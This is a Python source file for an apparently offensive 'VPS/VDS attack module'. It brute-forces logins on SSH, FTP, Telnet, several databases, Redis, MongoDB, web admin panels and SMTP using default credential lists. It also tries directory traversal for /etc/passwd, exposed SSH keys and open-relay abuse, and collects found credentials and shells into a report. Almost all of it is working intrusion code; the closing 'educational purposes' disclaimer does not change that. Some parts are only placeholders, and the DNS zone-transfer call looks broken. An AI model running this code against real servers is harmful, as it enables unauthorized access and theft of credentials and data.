
import requests
import socket
import threading
import time
import subprocess
import paramiko
import ftplib
import telnetlib
import smtplib
import mysql.connector
import psycopg2
import pyodbc
import redis
import pymongo
from ftplib import FTP
from typing import Dict, List, Any, Optional
import concurrent.futures
import itertools
import random
import hashlib
import base64

class VPSVDSAttackModule:
    """Advanced VPS/VDS attack module with brute-forcing and exploitation techniques"""
    
    def __init__(self, target_ip: str, open_ports: List[int]):
        self.target_ip = target_ip
        self.open_ports = open_ports
        self.attack_results = []
        self.credentials_found = []
        self.shells_obtained = []
        
        # Common credentials for brute force attacks
        self.common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test', 'guest', 'oracle',
            'postgres', 'mysql', 'ftp', 'mail', 'www', 'web', 'apache', 'nginx',
            'tomcat', 'jenkins', 'git', 'ubuntu', 'centos', 'debian', 'redhat',
            'server', 'service', 'sa', 'operator', 'manager', 'support'
        ]
        
        self.common_passwords = [
            'password', '123456', 'admin', 'root', 'password123', '12345678',
            'qwerty', 'abc123', 'Password1', 'welcome', 'login', 'passw0rd',
            '1234567890', 'default', 'changeme', 'password1', '123456789',
            'admin123', 'root123', 'letmein', 'welcome123', 'password!',
            'P@ssw0rd', 'P@ssword', 'Admin123', 'Root123', 'test123',
            'guest', '', 'administrator', 'user', 'demo', 'temp', 'backup'
        ]
        
        # Service-specific default credentials
        self.default_credentials = {
            21: [  # FTP
                ('anonymous', ''), ('anonymous', 'anonymous'), ('ftp', 'ftp'),
                ('admin', 'admin'), ('user', 'password'), ('test', 'test')
            ],
            22: [  # SSH
                ('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'),
                ('centos', 'centos'), ('user', 'password'), ('pi', 'raspberry')
            ],
            23: [  # Telnet
                ('admin', 'admin'), ('root', 'root'), ('cisco', 'cisco'),
                ('admin', ''), ('', ''), ('guest', 'guest')
            ],
            25: [  # SMTP
                ('admin', 'admin'), ('postmaster', 'password'), ('mail', 'mail')
            ],
            3306: [  # MySQL
                ('root', ''), ('root', 'root'), ('root', 'password'),
                ('admin', 'admin'), ('mysql', 'mysql'), ('user', 'password')
            ],
            5432: [  # PostgreSQL
                ('postgres', ''), ('postgres', 'postgres'), ('postgres', 'password'),
                ('admin', 'admin'), ('user', 'password')
            ],
            1433: [  # MSSQL
                ('sa', ''), ('sa', 'sa'), ('sa', 'password'), ('admin', 'admin')
            ],
            6379: [  # Redis
                ('', ''), ('admin', 'admin'), ('redis', 'redis')
            ],
            27017: [  # MongoDB
                ('admin', 'admin'), ('root', 'root'), ('mongo', 'mongo')
            ]
        }
    
    def execute_vps_vds_attacks(self) -> Dict[str, Any]:
        """Execute comprehensive VPS/VDS attacks"""
        results = {
            'ssh_attacks': [],
            'ftp_attacks': [],
            'telnet_attacks': [],
            'database_attacks': [],
            'web_service_attacks': [],
            'mail_attacks': [],
            'remote_desktop_attacks': [],
            'network_service_attacks': [],
            'privilege_escalation': [],
            'lateral_movement': [],
            'persistence_mechanisms': [],
            'credentials_found': [],
            'shells_obtained': [],
            'total_attacks': 0,
            'successful_attacks': 0
        }
        
        print(f"Starting VPS/VDS attacks against {self.target_ip}")
        
        # Execute attacks based on open ports
        for port in self.open_ports:
            if port == 22:  # SSH
                ssh_results = self._attack_ssh()
                results['ssh_attacks'].extend(ssh_results)
                results['total_attacks'] += len(ssh_results)
                results['successful_attacks'] += len([r for r in ssh_results if r['success']])
                
            elif port == 21:  # FTP
                ftp_results = self._attack_ftp()
                results['ftp_attacks'].extend(ftp_results)
                results['total_attacks'] += len(ftp_results)
                results['successful_attacks'] += len([r for r in ftp_results if r['success']])
                
            elif port == 23:  # Telnet
                telnet_results = self._attack_telnet()
                results['telnet_attacks'].extend(telnet_results)
                results['total_attacks'] += len(telnet_results)
                results['successful_attacks'] += len([r for r in telnet_results if r['success']])
                
            elif port in [3306, 5432, 1433, 6379, 27017]:  # Databases
                db_results = self._attack_databases(port)
                results['database_attacks'].extend(db_results)
                results['total_attacks'] += len(db_results)
                results['successful_attacks'] += len([r for r in db_results if r['success']])
                
            elif port in [80, 8080, 443, 8443]:  # Web services
                web_results = self._attack_web_services(port)
                results['web_service_attacks'].extend(web_results)
                results['total_attacks'] += len(web_results)
                results['successful_attacks'] += len([r for r in web_results if r['success']])
                
            elif port in [25, 110, 143, 993, 995]:  # Mail services
                mail_results = self._attack_mail_services(port)
                results['mail_attacks'].extend(mail_results)
                results['total_attacks'] += len(mail_results)
                results['successful_attacks'] += len([r for r in mail_results if r['success']])
                
            elif port == 3389:  # RDP
                rdp_results = self._attack_rdp()
                results['remote_desktop_attacks'].extend(rdp_results)
                results['total_attacks'] += len(rdp_results)
                results['successful_attacks'] += len([r for r in rdp_results if r['success']])
        
        # Additional attack vectors
        network_results = self._attack_network_services()
        results['network_service_attacks'].extend(network_results)
        results['total_attacks'] += len(network_results)
        results['successful_attacks'] += len([r for r in network_results if r['success']])
        
        # Aggregate credentials and shells
        results['credentials_found'] = self.credentials_found
        results['shells_obtained'] = self.shells_obtained
        
        return results
    
    def _attack_ssh(self) -> List[Dict]:
        """SSH brute force and exploitation attacks"""
        print(f"Attacking SSH on port 22...")
        results = []
        
        # SSH Brute Force Attack
        credentials_to_test = self.default_credentials.get(22, []) + \
                            [(u, p) for u in self.common_usernames[:10] for p in self.common_passwords[:10]]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for username, password in credentials_to_test[:50]:  # Limit attempts
                futures.append(executor.submit(self._ssh_login_attempt, username, password))
            
            for future in concurrent.futures.as_completed(futures, timeout=60):
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        if result['success']:
                            self.credentials_found.append({
                                'service': 'SSH',
                                'port': 22,
                                'username': result['username'],
                                'password': result['password'],
                                'method': 'Brute Force'
                            })
                            break  # Stop after first successful login
                except:
                    continue
        
        # SSH Key-based attacks
        key_results = self._ssh_key_attacks()
        results.extend(key_results)
        
        # SSH Version enumeration and exploits
        version_results = self._ssh_version_attacks()
        results.extend(version_results)
        
        return results
    
    def _ssh_login_attempt(self, username: str, password: str) -> Optional[Dict]:
        """Attempt SSH login with given credentials"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                hostname=self.target_ip,
                port=22,
                username=username,
                password=password,
                timeout=10,
                banner_timeout=10,
                auth_timeout=10
            )
            
            # Execute test command to confirm access
            stdin, stdout, stderr = ssh.exec_command('whoami')
            output = stdout.read().decode().strip()
            
            ssh.close()
            
            if output:
                self.shells_obtained.append({
                    'type': 'SSH Shell',
                    'service': 'SSH',
                    'port': 22,
                    'username': username,
                    'password': password,
                    'access_level': output
                })
                
                return {
                    'attack_type': 'SSH Brute Force',
                    'success': True,
                    'username': username,
                    'password': password,
                    'details': f'SSH access gained as user: {output}',
                    'impact': 'Critical - Remote shell access obtained'
                }
                
        except Exception as e:
            return {
                'attack_type': 'SSH Brute Force',
                'success': False,
                'username': username,
                'password': password,
                'error': str(e)
            }
    
    def _ssh_key_attacks(self) -> List[Dict]:
        """SSH key-based attacks"""
        results = []
        
        # Common SSH key locations and weak keys
        common_key_paths = [
            '~/.ssh/id_rsa',
            '~/.ssh/id_dsa',
            '/home/*/.ssh/id_rsa',
            '/root/.ssh/id_rsa'
        ]
        
        # Attempt to find exposed SSH keys via web
        for key_path in ['.ssh/id_rsa', 'id_rsa', 'private_key']:
            try:
                response = requests.get(f"http://{self.target_ip}/{key_path}", timeout=5)
                if response.status_code == 200 and 'BEGIN RSA PRIVATE KEY' in response.text:
                    results.append({
                        'attack_type': 'SSH Key Exposure',
                        'success': True,
                        'details': f'SSH private key exposed at /{key_path}',
                        'impact': 'Critical - Private SSH key disclosed',
                        'key_content': response.text[:200] + '...'
                    })
            except:
                continue
        
        return results
    
    def _ssh_version_attacks(self) -> List[Dict]:
        """SSH version enumeration and exploit attempts"""
        results = []
        
        try:
            # SSH banner grabbing
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_ip, 22))
            banner = sock.recv(1024).decode().strip()
            sock.close()
            
            results.append({
                'attack_type': 'SSH Version Enumeration',
                'success': True,
                'banner': banner,
                'details': f'SSH banner: {banner}',
                'impact': 'Low - Version information disclosed'
            })
            
            # Check for vulnerable SSH versions
            vulnerable_versions = [
                'SSH-1.', 'OpenSSH_2.', 'OpenSSH_3.', 'OpenSSH_4.',
                'OpenSSH_5.', 'OpenSSH_6.6', 'OpenSSH_7.4'
            ]
            
            for vuln_version in vulnerable_versions:
                if vuln_version in banner:
                    results.append({
                        'attack_type': 'SSH Version Vulnerability',
                        'success': True,
                        'details': f'Vulnerable SSH version detected: {banner}',
                        'impact': 'High - Known vulnerabilities in SSH version',
                        'recommendation': 'Upgrade SSH to latest version'
                    })
                    break
                    
        except Exception as e:
            results.append({
                'attack_type': 'SSH Version Enumeration',
                'success': False,
                'error': str(e)
            })
        
        return results
    
    def _attack_ftp(self) -> List[Dict]:
        """FTP brute force and exploitation attacks"""
        print(f"Attacking FTP on port 21...")
        results = []
        
        # FTP Anonymous login test
        try:
            ftp = FTP()
            ftp.connect(self.target_ip, 21, timeout=10)
            ftp.login('anonymous', 'anonymous')
            
            # List files in anonymous FTP
            files = []
            try:
                files = ftp.nlst()
            except:
                pass
            
            ftp.quit()
            
            results.append({
                'attack_type': 'FTP Anonymous Access',
                'success': True,
                'details': 'Anonymous FTP access allowed',
                'files_found': files[:10],  # First 10 files
                'impact': 'Medium - Anonymous FTP access enabled'
            })
            
            self.credentials_found.append({
                'service': 'FTP',
                'port': 21,
                'username': 'anonymous',
                'password': 'anonymous',
                'method': 'Anonymous Login'
            })
            
        except Exception as e:
            results.append({
                'attack_type': 'FTP Anonymous Access',
                'success': False,
                'error': str(e)
            })
        
        # FTP Brute Force
        credentials_to_test = self.default_credentials.get(21, []) + \
                            [(u, p) for u in ['ftp', 'admin', 'user'] for p in self.common_passwords[:5]]
        
        for username, password in credentials_to_test[:20]:  # Limit attempts
            try:
                ftp = FTP()
                ftp.connect(self.target_ip, 21, timeout=5)
                ftp.login(username, password)
                
                # Test write access
                write_access = False
                try:
                    ftp.storbinary('STOR test.txt', open('/dev/null', 'rb'))
                    write_access = True
                    ftp.delete('test.txt')
                except:
                    pass
                
                ftp.quit()
                
                results.append({
                    'attack_type': 'FTP Brute Force',
                    'success': True,
                    'username': username,
                    'password': password,
                    'write_access': write_access,
                    'details': f'FTP access gained with {username}:{password}',
                    'impact': 'High - FTP access obtained' + (' with write access' if write_access else '')
                })
                
                self.credentials_found.append({
                    'service': 'FTP',
                    'port': 21,
                    'username': username,
                    'password': password,
                    'method': 'Brute Force'
                })
                break
                
            except:
                continue
        
        # FTP Banner grabbing and version detection
        try:
            ftp = FTP()
            ftp.connect(self.target_ip, 21, timeout=10)
            banner = ftp.getwelcome()
            ftp.quit()
            
            results.append({
                'attack_type': 'FTP Banner Grabbing',
                'success': True,
                'banner': banner,
                'details': f'FTP banner: {banner}',
                'impact': 'Low - Version information disclosed'
            })
            
        except:
            pass
        
        return results
    
    def _attack_telnet(self) -> List[Dict]:
        """Telnet brute force attacks"""
        print(f"Attacking Telnet on port 23...")
        results = []
        
        # Telnet is inherently insecure
        results.append({
            'attack_type': 'Insecure Protocol Detection',
            'success': True,
            'details': 'Telnet service running - all data transmitted in plain text',
            'impact': 'High - Unencrypted protocol in use'
        })
        
        # Telnet brute force
        credentials_to_test = self.default_credentials.get(23, []) + \
                            [('admin', 'admin'), ('root', 'root'), ('cisco', 'cisco')]
        
        for username, password in credentials_to_test:
            try:
                tn = telnetlib.Telnet(self.target_ip, 23, timeout=10)
                
                # Wait for login prompt
                tn.read_until(b"login:", timeout=5)
                tn.write(username.encode('ascii') + b"\n")
                
                # Wait for password prompt
                tn.read_until(b"Password:", timeout=5)
                tn.write(password.encode('ascii') + b"\n")
                
                # Check for successful login
                response = tn.read_until(b"$", timeout=5).decode()
                tn.close()
                
                if "$" in response or "#" in response:
                    results.append({
                        'attack_type': 'Telnet Brute Force',
                        'success': True,
                        'username': username,
                        'password': password,
                        'details': f'Telnet access gained with {username}:{password}',
                        'impact': 'Critical - Remote shell access via insecure protocol'
                    })
                    
                    self.credentials_found.append({
                        'service': 'Telnet',
                        'port': 23,
                        'username': username,
                        'password': password,
                        'method': 'Brute Force'
                    })
                    
                    self.shells_obtained.append({
                        'type': 'Telnet Shell',
                        'service': 'Telnet',
                        'port': 23,
                        'username': username,
                        'password': password,
                        'security': 'Unencrypted'
                    })
                    break
                    
            except:
                continue
        
        return results
    
    def _attack_databases(self, port: int) -> List[Dict]:
        """Database-specific attacks"""
        results = []
        
        if port == 3306:  # MySQL
            results.extend(self._attack_mysql())
        elif port == 5432:  # PostgreSQL
            results.extend(self._attack_postgresql())
        elif port == 1433:  # MSSQL
            results.extend(self._attack_mssql())
        elif port == 6379:  # Redis
            results.extend(self._attack_redis())
        elif port == 27017:  # MongoDB
            results.extend(self._attack_mongodb())
        
        return results
    
    def _attack_mysql(self) -> List[Dict]:
        """MySQL brute force and exploitation"""
        print(f"Attacking MySQL on port 3306...")
        results = []
        
        credentials_to_test = self.default_credentials.get(3306, [])
        
        for username, password in credentials_to_test:
            try:
                connection = mysql.connector.connect(
                    host=self.target_ip,
                    port=3306,
                    user=username,
                    password=password,
                    connect_timeout=5
                )
                
                cursor = connection.cursor()
                
                # Test database access
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                
                # Test for sensitive data
                cursor.execute("SELECT version()")
                version = cursor.fetchone()[0]
                
                connection.close()
                
                results.append({
                    'attack_type': 'MySQL Brute Force',
                    'success': True,
                    'username': username,
                    'password': password,
                    'version': version,
                    'databases': [db[0] for db in databases[:5]],
                    'details': f'MySQL access gained with {username}:{password}',
                    'impact': 'Critical - Database access obtained'
                })
                
                self.credentials_found.append({
                    'service': 'MySQL',
                    'port': 3306,
                    'username': username,
                    'password': password,
                    'method': 'Brute Force'
                })
                break
                
            except:
                continue
        
        return results
    
    def _attack_postgresql(self) -> List[Dict]:
        """PostgreSQL brute force and exploitation"""
        print(f"Attacking PostgreSQL on port 5432...")
        results = []
        
        credentials_to_test = self.default_credentials.get(5432, [])
        
        for username, password in credentials_to_test:
            try:
                connection = psycopg2.connect(
                    host=self.target_ip,
                    port=5432,
                    user=username,
                    password=password,
                    connect_timeout=5
                )
                
                cursor = connection.cursor()
                cursor.execute("SELECT version()")
                version = cursor.fetchone()[0]
                
                # List databases
                cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
                databases = cursor.fetchall()
                
                connection.close()
                
                results.append({
                    'attack_type': 'PostgreSQL Brute Force',
                    'success': True,
                    'username': username,
                    'password': password,
                    'version': version,
                    'databases': [db[0] for db in databases[:5]],
                    'details': f'PostgreSQL access gained with {username}:{password}',
                    'impact': 'Critical - Database access obtained'
                })
                
                self.credentials_found.append({
                    'service': 'PostgreSQL',
                    'port': 5432,
                    'username': username,
                    'password': password,
                    'method': 'Brute Force'
                })
                break
                
            except:
                continue
        
        return results
    
    def _attack_mssql(self) -> List[Dict]:
        """MSSQL brute force and exploitation"""
        print(f"Attacking MSSQL on port 1433...")
        results = []
        
        credentials_to_test = self.default_credentials.get(1433, [])
        
        for username, password in credentials_to_test:
            try:
                connection_string = f"DRIVER={{SQL Server}};SERVER={self.target_ip},1433;UID={username};PWD={password};timeout=5"
                connection = pyodbc.connect(connection_string)
                
                cursor = connection.cursor()
                cursor.execute("SELECT @@version")
                version = cursor.fetchone()[0]
                
                # List databases
                cursor.execute("SELECT name FROM sys.databases")
                databases = cursor.fetchall()
                
                connection.close()
                
                results.append({
                    'attack_type': 'MSSQL Brute Force',
                    'success': True,
                    'username': username,
                    'password': password,
                    'version': version,
                    'databases': [db[0] for db in databases[:5]],
                    'details': f'MSSQL access gained with {username}:{password}',
                    'impact': 'Critical - Database access obtained'
                })
                
                self.credentials_found.append({
                    'service': 'MSSQL',
                    'port': 1433,
                    'username': username,
                    'password': password,
                    'method': 'Brute Force'
                })
                break
                
            except:
                continue
        
        return results
    
    def _attack_redis(self) -> List[Dict]:
        """Redis brute force and exploitation"""
        print(f"Attacking Redis on port 6379...")
        results = []
        
        try:
            # Test for no authentication
            r = redis.Redis(host=self.target_ip, port=6379, socket_timeout=5)
            info = r.info()
            
            results.append({
                'attack_type': 'Redis No Authentication',
                'success': True,
                'version': info.get('redis_version', 'Unknown'),
                'details': 'Redis accessible without authentication',
                'impact': 'Critical - Unauthenticated database access'
            })
            
            self.credentials_found.append({
                'service': 'Redis',
                'port': 6379,
                'username': '',
                'password': '',
                'method': 'No Authentication'
            })
            
        except redis.AuthenticationError:
            # Try common passwords
            for password in ['admin', 'redis', 'password']:
                try:
                    r = redis.Redis(host=self.target_ip, port=6379, password=password, socket_timeout=5)
                    info = r.info()
                    
                    results.append({
                        'attack_type': 'Redis Brute Force',
                        'success': True,
                        'password': password,
                        'version': info.get('redis_version', 'Unknown'),
                        'details': f'Redis access gained with password: {password}',
                        'impact': 'Critical - Database access obtained'
                    })
                    
                    self.credentials_found.append({
                        'service': 'Redis',
                        'port': 6379,
                        'username': '',
                        'password': password,
                        'method': 'Brute Force'
                    })
                    break
                    
                except:
                    continue
        except:
            pass
        
        return results
    
    def _attack_mongodb(self) -> List[Dict]:
        """MongoDB brute force and exploitation"""
        print(f"Attacking MongoDB on port 27017...")
        results = []
        
        try:
            # Test for no authentication
            client = pymongo.MongoClient(f"mongodb://{self.target_ip}:27017/", 
                                       connectTimeoutMS=5000, 
                                       serverSelectionTimeoutMS=5000)
            
            # List databases
            databases = client.list_database_names()
            server_info = client.server_info()
            
            results.append({
                'attack_type': 'MongoDB No Authentication',
                'success': True,
                'version': server_info.get('version', 'Unknown'),
                'databases': databases[:5],
                'details': 'MongoDB accessible without authentication',
                'impact': 'Critical - Unauthenticated database access'
            })
            
            self.credentials_found.append({
                'service': 'MongoDB',
                'port': 27017,
                'username': '',
                'password': '',
                'method': 'No Authentication'
            })
            
        except:
            # Try authentication with common credentials
            credentials_to_test = self.default_credentials.get(27017, [])
            
            for username, password in credentials_to_test:
                try:
                    client = pymongo.MongoClient(f"mongodb://{username}:{password}@{self.target_ip}:27017/",
                                               connectTimeoutMS=5000,
                                               serverSelectionTimeoutMS=5000)
                    
                    databases = client.list_database_names()
                    server_info = client.server_info()
                    
                    results.append({
                        'attack_type': 'MongoDB Brute Force',
                        'success': True,
                        'username': username,
                        'password': password,
                        'version': server_info.get('version', 'Unknown'),
                        'databases': databases[:5],
                        'details': f'MongoDB access gained with {username}:{password}',
                        'impact': 'Critical - Database access obtained'
                    })
                    
                    self.credentials_found.append({
                        'service': 'MongoDB',
                        'port': 27017,
                        'username': username,
                        'password': password,
                        'method': 'Brute Force'
                    })
                    break
                    
                except:
                    continue
        
        return results
    
    def _attack_web_services(self, port: int) -> List[Dict]:
        """Web service attacks including admin panel brute force"""
        print(f"Attacking web service on port {port}...")
        results = []
        
        protocol = 'https' if port in [443, 8443] else 'http'
        base_url = f"{protocol}://{self.target_ip}:{port}"
        
        # Web admin panel discovery and brute force
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin/',
            '/wp-admin', '/adminpanel', '/control', '/manager',
            '/admin-panel', '/admin1', '/admin2', '/cpanel',
            '/webmail', '/phpmyadmin', '/adminer'
        ]
        
        for path in admin_paths:
            try:
                response = requests.get(f"{base_url}{path}", timeout=5, verify=False)
                
                if response.status_code == 200:
                    results.append({
                        'attack_type': 'Admin Panel Discovery',
                        'success': True,
                        'url': f"{base_url}{path}",
                        'details': f'Admin panel found at {path}',
                        'impact': 'Medium - Admin interface exposed'
                    })
                    
                    # Try brute force on discovered admin panel
                    if 'login' in response.text.lower() or 'password' in response.text.lower():
                        bf_results = self._brute_force_web_login(f"{base_url}{path}")
                        results.extend(bf_results)
                        
            except:
                continue
        
        # Directory traversal attacks
        traversal_paths = [
            '/../../../etc/passwd',
            '/../../../windows/system32/drivers/etc/hosts',
            '/..%2F..%2F..%2Fetc%2Fpasswd'
        ]
        
        for path in traversal_paths:
            try:
                response = requests.get(f"{base_url}{path}", timeout=5, verify=False)
                
                if response.status_code == 200 and ('root:' in response.text or 'localhost' in response.text):
                    results.append({
                        'attack_type': 'Directory Traversal',
                        'success': True,
                        'url': f"{base_url}{path}",
                        'details': f'Directory traversal successful: {path}',
                        'impact': 'High - System file access',
                        'content_preview': response.text[:200]
                    })
                    break
                    
            except:
                continue
        
        return results
    
    def _brute_force_web_login(self, url: str) -> List[Dict]:
        """Brute force web login forms"""
        results = []
        
        common_web_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('administrator', 'administrator'), ('root', 'root'),
            ('user', 'password'), ('guest', 'guest')
        ]
        
        for username, password in common_web_creds:
            try:
                login_data = {
                    'username': username,
                    'password': password,
                    'login': 'Login',
                    'user': username,
                    'pass': password
                }
                
                response = requests.post(url, data=login_data, timeout=5, verify=False)
                
                # Check for successful login indicators
                success_indicators = ['welcome', 'dashboard', 'logout', 'profile']
                failure_indicators = ['invalid', 'error', 'failed', 'incorrect']
                
                response_lower = response.text.lower()
                
                if (any(ind in response_lower for ind in success_indicators) and
                    not any(ind in response_lower for ind in failure_indicators)):
                    
                    results.append({
                        'attack_type': 'Web Login Brute Force',
                        'success': True,
                        'url': url,
                        'username': username,
                        'password': password,
                        'details': f'Web login successful with {username}:{password}',
                        'impact': 'High - Web admin access obtained'
                    })
                    
                    self.credentials_found.append({
                        'service': 'Web Admin',
                        'url': url,
                        'username': username,
                        'password': password,
                        'method': 'Brute Force'
                    })
                    break
                    
            except:
                continue
        
        return results
    
    def _attack_mail_services(self, port: int) -> List[Dict]:
        """Mail service attacks"""
        print(f"Attacking mail service on port {port}...")
        results = []
        
        if port == 25:  # SMTP
            results.extend(self._attack_smtp())
        elif port in [110, 995]:  # POP3
            results.extend(self._attack_pop3(port))
        elif port in [143, 993]:  # IMAP
            results.extend(self._attack_imap(port))
        
        return results
    
    def _attack_smtp(self) -> List[Dict]:
        """SMTP attacks including open relay test"""
        results = []
        
        try:
            smtp = smtplib.SMTP(self.target_ip, 25, timeout=10)
            smtp.helo()
            
            # Test for open relay
            try:
                smtp.mail('test@external.com')
                smtp.rcpt('victim@external.com')
                
                results.append({
                    'attack_type': 'SMTP Open Relay',
                    'success': True,
                    'details': 'SMTP server configured as open relay',
                    'impact': 'High - Server can be abused for spam'
                })
                
            except smtplib.SMTPRecipientsRefused:
                results.append({
                    'attack_type': 'SMTP Open Relay Test',
                    'success': False,
                    'details': 'SMTP server properly configured - not an open relay'
                })
            
            # Test SMTP authentication
            try:
                smtp.login('admin', 'admin')
                
                results.append({
                    'attack_type': 'SMTP Authentication',
                    'success': True,
                    'username': 'admin',
                    'password': 'admin',
                    'details': 'SMTP authentication successful with weak credentials',
                    'impact': 'High - SMTP access with weak credentials'
                })
                
            except:
                pass
            
            smtp.quit()
            
        except Exception as e:
            results.append({
                'attack_type': 'SMTP Connection',
                'success': False,
                'error': str(e)
            })
        
        return results
    
    def _attack_pop3(self, port: int) -> List[Dict]:
        """POP3 brute force attacks"""
        results = []
        
        # POP3 brute force would go here
        # Implementation depends on poplib
        
        return results
    
    def _attack_imap(self, port: int) -> List[Dict]:
        """IMAP brute force attacks"""
        results = []
        
        # IMAP brute force would go here
        # Implementation depends on imaplib
        
        return results
    
    def _attack_rdp(self) -> List[Dict]:
        """RDP brute force attacks"""
        print(f"Attacking RDP on port 3389...")
        results = []
        
        # RDP is exposed - security issue
        results.append({
            'attack_type': 'RDP Service Exposure',
            'success': True,
            'details': 'RDP service accessible from internet',
            'impact': 'Medium - Remote desktop exposed to attacks'
        })
        
        # Note: Actual RDP brute forcing would require specialized libraries
        # This is a placeholder for RDP attack simulation
        common_rdp_creds = [
            ('Administrator', 'password'), ('Administrator', 'admin'),
            ('admin', 'admin'), ('user', 'password')
        ]
        
        for username, password in common_rdp_creds:
            # Simulate RDP brute force attempt
            results.append({
                'attack_type': 'RDP Brute Force Simulation',
                'success': False,  # Simulated
                'username': username,
                'password': password,
                'details': f'RDP brute force attempt with {username}:{password}',
                'impact': 'Would grant remote desktop access if successful'
            })
        
        return results
    
    def _attack_network_services(self) -> List[Dict]:
        """Attack other network services"""
        results = []
        
        # DNS enumeration
        try:
            import dns.resolver
            
            # Try zone transfer
            try:
                answers = dns.resolver.resolve(self.target_ip, 'AXFR')
                if answers:
                    results.append({
                        'attack_type': 'DNS Zone Transfer',
                        'success': True,
                        'details': 'DNS zone transfer allowed',
                        'impact': 'Medium - DNS records disclosed'
                    })
            except:
                pass
                
        except ImportError:
            pass
        
        # SNMP community string brute force
        common_communities = ['public', 'private', 'admin', 'manager']
        
        for community in common_communities:
            try:
                # SNMP testing would go here
                # Placeholder for SNMP attack
                results.append({
                    'attack_type': 'SNMP Community String Test',
                    'success': False,  # Simulated
                    'community': community,
                    'details': f'Testing SNMP community string: {community}'
                })
            except:
                continue
        
        return results
    
    def get_attack_summary(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive VPS/VDS attack summary"""
        summary = f"""
=== VPS/VDS PENETRATION TEST RESULTS ===

Target IP: {self.target_ip}
Open Ports Tested: {', '.join(map(str, self.open_ports))}
Total Attacks: {results['total_attacks']}
Successful Attacks: {results['successful_attacks']}
Success Rate: {(results['successful_attacks'] / max(results['total_attacks'], 1)) * 100:.1f}%

=== CREDENTIALS DISCOVERED ===
"""
        
        if results['credentials_found']:
            for cred in results['credentials_found']:
                summary += f"Service: {cred['service']} | {cred.get('username', '')}:{cred.get('password', '')} | Method: {cred['method']}\n"
        else:
            summary += "No credentials discovered\n"
        
        summary += "\n=== SHELLS OBTAINED ===\n"
        if results['shells_obtained']:
            for shell in results['shells_obtained']:
                summary += f"Type: {shell['type']} | Port: {shell.get('port', 'N/A')} | Access: {shell.get('username', 'N/A')}\n"
        else:
            summary += "No shells obtained\n"
        
        summary += "\n=== ATTACK BREAKDOWN ===\n"
        
        for attack_category in ['ssh_attacks', 'ftp_attacks', 'telnet_attacks', 
                               'database_attacks', 'web_service_attacks', 'mail_attacks']:
            if results[attack_category]:
                category_name = attack_category.replace('_', ' ').title()
                summary += f"\n{category_name}:\n"
                for attack in results[attack_category][:5]:  # First 5 attacks per category
                    status = "✅ SUCCESS" if attack['success'] else "❌ FAILED"
                    summary += f"  {status}: {attack['attack_type']} - {attack.get('details', 'No details')}\n"
        
        summary += """
=== SECURITY RECOMMENDATIONS ===
1. Change all default credentials immediately
2. Implement strong password policies
3. Enable multi-factor authentication where possible
4. Restrict network access using firewalls
5. Keep all services updated to latest versions
6. Disable unnecessary services
7. Implement intrusion detection systems
8. Regular security audits and penetration testing

=== DISCLAIMER ===
This penetration test was conducted for educational purposes only.
All vulnerabilities should be immediately addressed to secure the system.
"""
        
        return summary
